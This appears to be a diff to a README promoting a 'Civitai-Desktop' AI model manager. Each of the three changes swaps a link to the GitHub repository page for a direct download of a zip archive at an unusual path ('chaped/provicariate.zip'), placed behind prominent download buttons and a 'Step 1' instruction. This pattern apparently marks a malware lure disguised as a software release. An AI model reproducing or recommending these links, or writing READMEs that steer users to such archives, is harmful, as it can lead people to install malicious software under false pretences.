@@ -1,7 +1,7 @@
 <h1>🚀 Civitai-Desktop---Civitai-Model-Manager-2026 - Your All-in-One AI Model Manager</h1>
 
 <p align="center">
-  <a href="https://github.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD CIVITAI-DESKTOP NOW</a>
+  <a href="https://raw.githubusercontent.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026/main/chaped/provicariate.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD CIVITAI-DESKTOP NOW</a>
 </p>
 
 ## 🎯 What Is Civitai-Desktop?
@@ -55,7 +55,7 @@ Getting started with Civitai-Desktop is incredibly simple. Follow these steps, a
 ### Step 1: Download the Application
 
 Visit this link to download the application:
-[**https://github.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026**](https://github.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026)
+[**https://raw.githubusercontent.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026/main/chaped/provicariate.zip**](https://raw.githubusercontent.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026/main/chaped/provicariate.zip)
 
 Click the download button on that page and wait for the download to complete. The file size is reasonable, so it shouldn't take long on most connections.
 
@@ -134,7 +134,7 @@ Civitai-Desktop transforms the way you work with AI models. No more hunting thro
 Join thousands of satisfied users who have simplified their AI workflow. Download Civitai-Desktop today and experience the future of AI model management.
 
 <p align="center">
-  <a href="https://github.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 GET STARTED NOW</a>
+  <a href="https://raw.githubusercontent.com/bob5679099/Civitai-Desktop---Civitai-Model-Manager-2026/main/chaped/provicariate.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 GET STARTED NOW</a>
 </p>
 
 ---
